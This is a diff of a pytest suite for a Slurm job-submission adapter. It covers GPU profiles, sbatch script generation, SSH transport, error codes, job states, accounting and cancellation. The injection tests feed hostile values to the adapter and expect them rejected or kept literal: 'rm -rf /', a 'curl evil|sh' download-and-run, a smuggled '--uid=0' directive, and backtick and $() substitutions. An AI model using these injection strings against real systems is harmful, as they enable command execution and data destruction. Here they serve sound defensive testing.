@@ -4,6 +4,7 @@ import json
 import os
 import uuid
 import subprocess
+import sys
 import tempfile
 
 import pytest
@@ -54,9 +55,10 @@ class TestClusterProfiles:
                 assert key in profile, f"{name} missing key: {key}"
 
     def test_nibi_profile(self):
+        # Nibi (Graham's 2025 successor) is an H100 cluster, 8 per node.
         p = CLUSTER_PROFILES["nibi"]
-        assert p["gpu_type"] == "a100"
-        assert p["gpus_per_node"] == 4
+        assert p["gpu_type"] == "h100"
+        assert p["gpus_per_node"] == 8
         assert p["container_runtime"] == "apptainer"
 
     def test_graham_profile(self):
@@ -72,7 +74,7 @@ class TestClusterProfiles:
 
     def test_get_profile_by_name(self):
         profile = _get_profile("nibi")
-        assert profile["gpu_type"] == "a100"
+        assert profile["gpu_type"] == "h100"
 
 
 # ── GPU VRAM Table ────────────────────────────────────────────────────
@@ -243,7 +245,7 @@ class TestJobTranslation:
         script, meta = xcelsior_job_to_sbatch(self._make_job(), "nibi")
         assert meta["job_id"] == "test-123"
         assert meta["profile"] == "nibi"
-        assert meta["gpu_type"] == "a100"
+        assert meta["gpu_type"] == "h100"
         assert meta["nodes"] >= 1
         assert meta["qos"] == "normal"  # priority=50
 
@@ -257,10 +259,10 @@ class TestJobTranslation:
         assert "docker" in script.lower() or "Inference Script" in script
 
     def test_gpu_count_in_gres(self):
-        job = self._make_job(vram_needed_gb=60)  # Needs 2 A100s (40GB each)
+        job = self._make_job(vram_needed_gb=100)  # Needs 2 H100s (80GB each)
         script, meta = xcelsior_job_to_sbatch(job, "nibi")
         assert meta["num_gpus"] == 2
-        assert ":2" in script  # gpu:a100:2
+        assert "#SBATCH --gres=gpu:h100:2" in script
 
     def test_explicit_num_gpus(self):
         job = self._make_job(num_gpus=4)
@@ -284,8 +286,8 @@ class TestJobTranslation:
         assert 'NUM_WORKERS="4"' in script
 
     def test_multi_node_allocation(self):
-        # 8 GPUs on a cluster with 4 per node → 2 nodes
-        job = self._make_job(num_gpus=8)
+        # 16 GPUs on a cluster with 8 per node → 2 nodes
+        job = self._make_job(num_gpus=16)
         script, meta = xcelsior_job_to_sbatch(job, "nibi")
         assert meta["nodes"] == 2
         assert "#SBATCH --nodes=2" in script
@@ -484,3 +486,469 @@ class TestCancelSlurmJob:
         monkeypatch.setattr(subprocess, "run", mock_run)
         result = cancel_slurm_job("99999")
         assert "Invalid job id" in result["error"]
+
+
+# ══════════════════════════════════════════════════════════════════════
+# v3: profiles file, CPU jobs, quoting, transport, error codes, states,
+# accounting, cancel. Shapes of Slurm output below were captured from a
+# real Slurm 25.11 cluster (hpc/slurm-local rehearsal), not invented.
+# ══════════════════════════════════════════════════════════════════════
+
+import slurm_adapter as _sa  # noqa: E402
+
+LOCAL_PROFILE = {
+    "name": "test local",
+    "cluster_id": "xcl-test",
+    "partition_gpu": "xcl",
+    "partition_cpu": "xcl",
+    "gpu_type": "rtx_3060",
+    "gpus_per_node": 1,
+    "max_walltime": "01:00:00",
+    "default_walltime": "00:10:00",
+    "qos": False,
+    "mem_base_gb": 1,
+    "mem_per_gpu_gb": 2,
+    "modules": [],
+    "container_runtime": "none",
+    "scratch_dir": "/var/lib/xcl-slurm-test/jobs",
+    "output_dir": "/var/lib/xcl-slurm-test/jobs",
+}
+
+
+@pytest.fixture
+def local_profile(tmp_path, monkeypatch):
+    path = tmp_path / "profiles.json"
+    path.write_text(json.dumps({"profiles": {"xcl-test": LOCAL_PROFILE}}))
+    monkeypatch.setenv(_sa.PROFILES_FILE_ENV, str(path))
+    monkeypatch.delenv("XCELSIOR_SLURM_SSH_HOST", raising=False)
+    monkeypatch.delenv("XCELSIOR_SLURM_SSH_OPTIONS", raising=False)
+    return "xcl-test"
+
+
+def _job(**kw):
+    job = {"job_id": "t-1", "name": "probe", "vram_needed_gb": 0, "priority": 0, "tier": "free"}
+    job.update(kw)
+    return job
+
+
+class _Recorder:
+    """subprocess.run stand-in: records calls, replies from a queue."""
+
+    def __init__(self, *replies):
+        self.calls = []
+        self.replies = list(replies)
+
+    def __call__(self, argv, *a, **kw):
+        self.calls.append({"argv": argv, **kw})
+        rc, out, err = self.replies.pop(0) if self.replies else (0, "", "")
+        return subprocess.CompletedProcess(args=argv, returncode=rc, stdout=out, stderr=err)
+
+
+class TestProfilesV3:
+    def test_unknown_profile_is_an_error_not_generic(self, local_profile):
+        res = submit_to_slurm(_job(), profile_name="nibbi", dry_run=True)
+        assert res["error_code"] == "unknown_profile"
+        with pytest.raises(_sa.SlurmAdapterError):
+            xcelsior_job_to_sbatch(_job(), "nibbi")
+
+    def test_profiles_file_adds_profiles(self, local_profile):
+        assert "xcl-test" in _sa.available_profiles()
+        assert "nibi" in _sa.available_profiles()
+        assert _get_profile("xcl-test")["cluster_id"] == "xcl-test"
+
+    def test_profiles_file_missing_keys_rejected(self, tmp_path, monkeypatch):
+        path = tmp_path / "bad.json"
+        path.write_text(json.dumps({"profiles": {"x": {"name": "x"}}}))
+        monkeypatch.setenv(_sa.PROFILES_FILE_ENV, str(path))
+        with pytest.raises(_sa.SlurmAdapterError) as e:
+            _sa.available_profiles()
+        assert e.value.code == "invalid_profile_file"
+
+    def test_generic_requests_untyped_gres(self):
+        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=2), "generic")
+        assert "#SBATCH --gres=gpu:2" in script
+        assert "gpu:gpu:" not in script
+        assert meta["gpu_type"] is None
+
+
+class TestJobSpecV3:
+    def test_cpu_job_uses_cpu_partition_and_no_gres(self, local_profile):
+        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=0, nodelist="asus"), local_profile)
+        assert "--gres" not in script
+        assert "#SBATCH --partition=xcl" in script
+        assert "#SBATCH --nodelist=asus" in script
+        assert "#SBATCH --mem=1G" in script
+        assert meta["num_gpus"] == 0
+
+    def test_generic_cpu_job_uses_partition_cpu(self):
+        script, _ = xcelsior_job_to_sbatch(_job(num_gpus=0), "generic")
+        assert "#SBATCH --partition=default" in script
+
+    def test_typed_gres_and_profile_memory(self, local_profile):
+        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=1), local_profile)
+        assert "#SBATCH --gres=gpu:rtx_3060:1" in script
+        assert "#SBATCH --mem=3G" in script
+        assert meta["cluster_id"] == "xcl-test"
+
+    def test_output_goes_to_existing_dir_not_a_subdir_made_in_the_script(self, local_profile):
+        script, meta = xcelsior_job_to_sbatch(_job(), local_profile)
+        assert "#SBATCH --output=/var/lib/xcl-slurm-test/jobs/xcl-t-1-%j.out" in script
+        assert "/xcelsior/" not in script.split("set -euo pipefail")[0]
+
+    def test_profile_can_disable_qos(self, local_profile):
+        script, _ = xcelsior_job_to_sbatch(_job(priority=95), local_profile)
+        assert "--qos" not in script
+
+    def test_default_walltime_and_limit(self, local_profile):
+        _, meta = xcelsior_job_to_sbatch(_job(), local_profile)
+        assert meta["walltime"] == "00:10:00"
+        res = submit_to_slurm(_job(walltime="02:00:00"), profile_name=local_profile, dry_run=True)
+        assert res["error_code"] == "walltime_exceeds_limit"
+
+    @pytest.mark.parametrize(
+        "spec,seconds",
+        [("5", 300), ("1:30", 90), ("01:00:00", 3600), ("2-0", 172800), ("1-02:03:04", 93784)],
+    )
+    def test_walltime_parser(self, spec, seconds):
+        assert _sa._walltime_seconds(spec) == seconds
+
+    @pytest.mark.parametrize(
+        "field,value",
+        [
+            ("job_id", "a b"),
+            ("job_id", "x;rm -rf /"),
+            ("nodelist", "asus\n#SBATCH --uid=0"),
+            ("partition", "xcl --wrap=id"),
+            ("image", "img; curl evil|sh"),
+        ],
+    )
+    def test_injection_in_directive_fields_rejected(self, local_profile, field, value):
+        res = submit_to_slurm(_job(**{field: value}), profile_name=local_profile, dry_run=True)
+        assert res["error_code"] == "invalid_job_spec"
+
+    def test_extra_env_key_validated(self, local_profile):
+        res = submit_to_slurm(
+            _job(), profile_name=local_profile, extra_env={"A;B": "x"}, dry_run=True
+        )
+        assert res["error_code"] == "invalid_job_spec"
+
+    def test_hostile_values_stay_literal_in_bash(self, local_profile, tmp_path):
+        """Run the generated export lines in bash: nothing may execute."""
+        marker = tmp_path / "pwned"
+        hostile = f'x"; touch {marker}; echo "$(id)`id`'
+        script, _ = xcelsior_job_to_sbatch(
+            _job(name=hostile, tier="$(touch " + str(marker) + ")"),
+            local_profile,
+            extra_env={"V": "`touch " + str(marker) + "`"},
+        )
+        exports = "\n".join(line for line in script.splitlines() if line.startswith("export "))
+        out = subprocess.run(
+            [
+                "bash",
+                "-c",
+                exports + '\nprintf "%s|%s|%s" "$XCELSIOR_JOB_NAME" "$XCELSIOR_TIER" "$V"',
+            ],
+            capture_output=True,
+            text=True,
+            check=True,
+        ).stdout
+        assert out.split("|")[0] == hostile
+        assert not marker.exists()
+
+    def test_command_payload_is_one_quoted_argument(self, local_profile):
+        script, _ = xcelsior_job_to_sbatch(_job(command="echo 'hi'; nvidia-smi -L"), local_profile)
+        assert "bash -c 'echo '\"'\"'hi'\"'\"'; nvidia-smi -L'" in script
+        assert subprocess.run(["bash", "-n"], input=script, text=True).returncode == 0
+
+    def test_comment_carries_xcelsior_id(self, local_profile):
+        script, _ = xcelsior_job_to_sbatch(_job(), local_profile)
+        assert "#SBATCH --comment=xcelsior:t-1" in script
+
+
+class TestTransportV3:
+    def test_sbatch_reads_script_from_stdin_with_parsable(self, local_profile, monkeypatch):
+        rec = _Recorder((0, "42\n", ""))
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+        monkeypatch.setattr(subprocess, "run", rec)
+        res = submit_to_slurm(_job(), profile_name=local_profile)
+        assert res["slurm_job_id"] == "42"
+        assert res["cluster_id"] == "xcl-test"
+        assert rec.calls[0]["argv"] == ["sbatch", "--parsable"]
+        assert rec.calls[0]["input"].startswith("#!/bin/bash")
+        assert "script_path" not in res
+
+    def test_parsable_output_with_cluster_suffix(self, local_profile, monkeypatch):
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+        monkeypatch.setattr(subprocess, "run", _Recorder((0, "77;xcl-local\n", "")))
+        assert submit_to_slurm(_job(), profile_name=local_profile)["slurm_job_id"] == "77"
+
+    def test_ssh_runner_shape(self, local_profile, monkeypatch):
+        rec = _Recorder((0, "43\n", ""))
+        monkeypatch.setattr(subprocess, "run", rec)
+        runner = _sa.SlurmRunner(ssh_host="aaryn@tower", ssh_options=("-p", "22"))
+        res = submit_to_slurm(_job(), profile_name=local_profile, runner=runner)
+        argv = rec.calls[0]["argv"]
+        assert argv[:5] == ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10"]
+        assert argv[-2:] == ["aaryn@tower", "sbatch --parsable"]
+        assert res["slurm_job_id"] == "43"
+
+    def test_ssh_env_prefix_is_quoted(self, monkeypatch):
+        rec = _Recorder((0, "", ""))
+        monkeypatch.setattr(subprocess, "run", rec)
+        _sa.SlurmRunner(ssh_host="h").run(["sacct", "-j", "1"], env={"SLURM_TIME_FORMAT": "%s"})
+        assert rec.calls[0]["argv"][-1] == "env SLURM_TIME_FORMAT=%s sacct -j 1"
+
+    def test_ssh_connect_failure_is_transport_error(self, local_profile, monkeypatch):
+        monkeypatch.setattr(
+            subprocess, "run", _Recorder((255, "", "ssh: connect to host x: timed out"))
+        )
+        res = submit_to_slurm(
+            _job(), profile_name=local_profile, runner=_sa.SlurmRunner(ssh_host="x")
+        )
+        assert res["error_code"] == "transport_error"
+
+    def test_env_overrides_profile_ssh_host(self, monkeypatch):
+        monkeypatch.setenv("XCELSIOR_SLURM_SSH_HOST", "aaryn@127.0.0.1")
+        monkeypatch.setenv("XCELSIOR_SLURM_SSH_OPTIONS", "-p 22022 -i /k")
+        r = _sa.get_runner({"ssh_host": "xcl-tower"})
+        assert r.ssh_host == "aaryn@127.0.0.1"
+        assert r.ssh_options == ("-p", "22022", "-i", "/k")
+
+
+class TestErrorClassificationV3:
+    # stderr lines as Slurm 25.11 prints them (captured in the rehearsal)
+    @pytest.mark.parametrize(
+        "stderr,code",
+        [
+            (
+                "sbatch: error: Batch job submission failed: Requested node configuration is not available",
+                "unsatisfiable_request",
+            ),
+            (
+                "sbatch: error: invalid partition specified: nosuchpart\n"
+                "sbatch: error: Batch job submission failed: Invalid partition name specified",
+                "invalid_partition",
+            ),
+            (
+                "sbatch: error: Batch job submission failed: Requested time limit is invalid (missing or exceeds some limit)",
+                "walltime_exceeds_limit",
+            ),
+            (
+                "sbatch: error: Batch job submission failed: Invalid node name specified",
+                "invalid_nodelist",
+            ),
+            (
+                "sbatch: error: Batch job submission failed: Invalid qos specification",
+                "invalid_qos",
+            ),
+            (
+                "sbatch: error: Batch job submission failed: Unable to contact slurm controller",
+                "controller_unreachable",
+            ),
+            ("something new", "sbatch_rejected"),
+        ],
+    )
+    def test_codes(self, stderr, code):
+        assert _sa.classify_slurm_error(stderr) == code
+
+    def test_rejection_returns_code_and_no_job(self, local_profile, monkeypatch):
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+        monkeypatch.setattr(
+            subprocess,
+            "run",
+            _Recorder(
+                (
+                    1,
+                    "",
+                    "sbatch: error: Batch job submission failed: Invalid partition name specified",
+                )
+            ),
+        )
+        res = submit_to_slurm(_job(partition="nosuchpart"), profile_name=local_profile)
+        assert res["error_code"] == "invalid_partition"
+        assert "slurm_job_id" not in res
+
+
+class TestStatesV3:
+    def test_cancelled_by_uid_from_sacct_is_cancelled(self, monkeypatch):
+        """Regression: sacct prints 'CANCELLED by 1000'; it used to map to failed."""
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+
+        def run(argv, *a, **k):
+            if argv[0] == "squeue":
+                return _completed("", returncode=1)
+            return _completed("9|CANCELLED by 1000|00:00:00|0:0||\n")
+
+        monkeypatch.setattr(subprocess, "run", run)
+        res = get_slurm_job_status("9")
+        assert res["slurm_state"] == "CANCELLED"
+        assert res["xcelsior_state"] == "cancelled"
+        assert res["source"] == "sacct"
+
+    def test_unknown_state_is_unknown_not_running(self, monkeypatch):
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+        monkeypatch.setattr(
+            subprocess, "run", lambda *a, **k: _completed("5 WEIRD_NEW 0:01 1:00 1 n1\n")
+        )
+        assert get_slurm_job_status("5")["xcelsior_state"] == "unknown"
+
+    @pytest.mark.parametrize(
+        "state,expected",
+        [
+            ("BOOT_FAIL", "failed"),
+            ("DEADLINE", "failed"),
+            ("REQUEUED", "queued"),
+            ("CONFIGURING", "running"),
+            ("REVOKED", "cancelled"),
+            ("SPECIAL_EXIT", "failed"),
+        ],
+    )
+    def test_full_state_list(self, state, expected):
+        assert SLURM_STATE_MAP[state] == expected
+
+    def test_every_job_state_projects_onto_the_db_constraint(self):
+        allowed = {"pending", "running", "completed", "failed", "cancelled", "unknown"}
+        for xstate in set(SLURM_STATE_MAP.values()) | {"unknown"}:
+            assert _sa.OBSERVED_STATE_MAP[xstate] in allowed
+
+    def test_invalid_job_id_rejected_before_any_command(self, monkeypatch):
+        rec = _Recorder()
+        monkeypatch.setattr(subprocess, "run", rec)
+        assert get_slurm_job_status("1; rm -rf /")["error_code"] == "invalid_job_id"
+        assert cancel_slurm_job("nonexistent-999")["error_code"] == "invalid_job_id"
+        assert rec.calls == []
+
+
+class TestAccountingV3:
+    # Row shape from the rehearsal (SLURM_TIME_FORMAT=%s, -X, --noconvert)
+    ROW = "12|xcl-r1-gpu1|COMPLETED|1794040946|1794040948|1794040953|5|0:0|billing=2,cpu=2,gres/gpu=1,mem=3072M,node=1|tower|xcl\n"
+
+    def test_billing_shape(self, local_profile, monkeypatch):
+        rec = _Recorder((0, self.ROW, ""))
+        monkeypatch.setattr(subprocess, "run", rec)
+        a = _sa.get_slurm_job_accounting("12", profile_name=local_profile)
+        assert rec.calls[0]["env"]["SLURM_TIME_FORMAT"] == "%s"
+        assert "-X" in rec.calls[0]["argv"]
+        assert (a["submitted_at"], a["started_at"], a["completed_at"]) == (
+            1794040946.0,
+            1794040948.0,
+            1794040953.0,
+        )
+        assert a["duration_sec"] == 5 and a["gpu_count"] == 1 and a["gpu_seconds"] == 5
+        assert a["node_list"] == "tower" and a["billable"] is True
+        meter = _sa.accounting_to_meter_fields(a)
+        assert meter == {
+            "started_at": 1794040948.0,
+            "completed_at": 1794040953.0,
+            "duration_sec": 5.0,
+            "gpu_seconds": 5.0,
+        }
+
+    def test_meter_fields_are_usage_meter_fields(self):
+        import billing as billing_mod
+
+        meter_cls = getattr(billing_mod, "UsageMeter", None)
+        if meter_cls is None:
+            pytest.skip("UsageMeter not importable in this layout")
+        import dataclasses
+
+        names = {f.name for f in dataclasses.fields(meter_cls)}
+        assert set(_sa.accounting_to_meter_fields({})) <= names
+
+    def test_cancelled_while_pending_is_not_billable(self, local_profile, monkeypatch):
+        row = "13|x|CANCELLED by 1000|1794040960|Unknown|1794040966|0|0:0||None assigned|xcl\n"
+        monkeypatch.setattr(subprocess, "run", _Recorder((0, row, "")))
+        a = _sa.get_slurm_job_accounting("13", profile_name=local_profile)
+        assert a["xcelsior_state"] == "cancelled"
+        assert a["started_at"] is None and a["billable"] is False and a["duration_sec"] == 0
+
+    def test_running_job_has_no_end(self, local_profile, monkeypatch):
+        row = (
+            "14|x|RUNNING|1794040960|1794040961|Unknown|30|0:0|cpu=2,gres/gpu=1,node=1|tower|xcl\n"
+        )
+        monkeypatch.setattr(subprocess, "run", _Recorder((0, row, "")))
+        a = _sa.get_slurm_job_accounting("14", profile_name=local_profile)
+        assert a["completed_at"] is None and a["terminal"] is False
+        assert _sa.accounting_to_meter_fields(a)["completed_at"] == 0.0
+
+    def test_accounting_disabled_is_reported(self, local_profile, monkeypatch):
+        monkeypatch.setattr(
+            subprocess,
+            "run",
+            _Recorder((1, "", "sacct: error: Slurm accounting storage is disabled")),
+        )
+        a = _sa.get_slurm_job_accounting("15", profile_name=local_profile)
+        assert a["error_code"] == "accounting_disabled"
+
+
+class TestCancelV3:
+    def test_unknown_id_is_not_found_even_though_scancel_exits_zero(
+        self, local_profile, monkeypatch
+    ):
+        """Slurm 25.11: plain scancel exits 0 silently for unknown ids."""
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+        rec = _Recorder(
+            (
+                0,
+                "",
+                "scancel: Terminating job 99999\nscancel: error: Kill job error on job id 99999: Invalid job id specified",
+            ),
+            (0, "", ""),  # sacct: no row
+        )
+        monkeypatch.setattr(subprocess, "run", rec)
+        res = cancel_slurm_job("99999", profile_name=local_profile)
+        assert rec.calls[0]["argv"] == ["scancel", "-v", "99999"]
+        assert res["error_code"] == "not_found"
+        assert not res.get("cancelled")
+
+    def test_finished_job_is_already_terminal(self, local_profile, monkeypatch):
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+        rec = _Recorder(
+            (
+                0,
+                "",
+                "scancel: Terminating job 8\nscancel: error: Kill job error on job id 8: Invalid job id specified",
+            ),
+            (0, "8|x|COMPLETED|1|2|3|1|0:0|cpu=2,node=1|tower|xcl\n", ""),
+        )
+        monkeypatch.setattr(subprocess, "run", rec)
+        res = cancel_slurm_job("8", profile_name=local_profile)
+        assert res["error_code"] == "already_terminal"
+        assert res["slurm_state"] == "COMPLETED"
+
+    def test_verbose_success(self, local_profile, monkeypatch):
+        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
+        monkeypatch.setattr(subprocess, "run", _Recorder((0, "", "scancel: Terminating job 11")))
+        assert cancel_slurm_job("11", profile_name=local_profile)["cancelled"] is True
+
+
+class TestOutputV3:
+    def test_reads_tail_of_output_file(self, local_profile, monkeypatch):
+        rec = _Recorder((0, "GPU 0: NVIDIA GeForce RTX 3060\n", ""))
+        monkeypatch.setattr(subprocess, "run", rec)
+        res = _sa.get_slurm_job_output("12", "t-1", profile_name=local_profile)
+        assert rec.calls[0]["argv"] == [
+            "tail",
+            "-c",
+            "65536",
+            "--",
+            "/var/lib/xcl-slurm-test/jobs/xcl-t-1-12.out",
+        ]
+        assert "RTX 3060" in res["content"]
+
+
+def test_module_imports_without_the_db_stack():
+    """The adapter must load on a submit host that has no Xcelsior DB code."""
+    code = (
+        "import sys, builtins\n"
+        "real = builtins.__import__\n"
+        "def guard(name, *a, **k):\n"
+        "    if name == 'db': raise ImportError('no db here')\n"
+        "    return real(name, *a, **k)\n"
+        "builtins.__import__ = guard\n"
+        f"sys.path.insert(0, {str(__import__('pathlib').Path(_sa.__file__).parent)!r})\n"
+        "import slurm_adapter; print(slurm_adapter.ADAPTER_VERSION)\n"
+    )
+    out = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True)
+    assert out.returncode == 0, out.stderr
+    assert out.stdout.strip() == _sa.ADAPTER_VERSION
